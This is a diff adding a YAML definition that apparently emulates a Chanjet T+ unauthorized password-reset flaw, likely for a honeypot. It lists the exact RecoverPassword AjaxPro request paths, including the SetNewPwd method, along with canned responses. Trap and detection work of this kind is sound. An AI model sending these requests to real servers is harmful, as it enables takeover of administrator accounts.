@@ -1,0 +1,37 @@
+id: chanjet-tplus-unauth-passreset
+info:
+  name: Chanjet Tplus - Unauthorized Password Reset
+  author: 0xr2r
+  description: 'There is an unauthorized administrator password modification vulnerability
+    in UF Chanjet T+ RecoverPassword.aspx. An attacker can use this vulnerability
+    to modify the administrator account password to log in to the backend.
+
+    '
+  severity: high
+  reference:
+  - https://cn-sec.com/archives/1377207.html
+  - https://www.chanjet.com
+  metadata:
+    verified: true
+    max-request: 2
+    fofa-query: app="畅捷通-TPlus"
+  tags: tplus,unauth,chanjet
+traps:
+- request:
+    method: GET
+    path: /tplus/ajaxpro/RecoverPassword,App_Web_recoverpassword.aspx.cdcab7d2.ashx?method=
+    headers: null
+    body: null
+  response:
+    status_code: 200
+    headers: {}
+    body: tplus”应用程序中的服务器错误
+- request:
+    method: GET
+    path: /tplus/ajaxpro/RecoverPassword,App_Web_recoverpassword.aspx.cdcab7d2.ashx?method=SetNewPwd
+    headers: null
+    body: null
+  response:
+    status_code: 200
+    headers: {}
+    body: ''
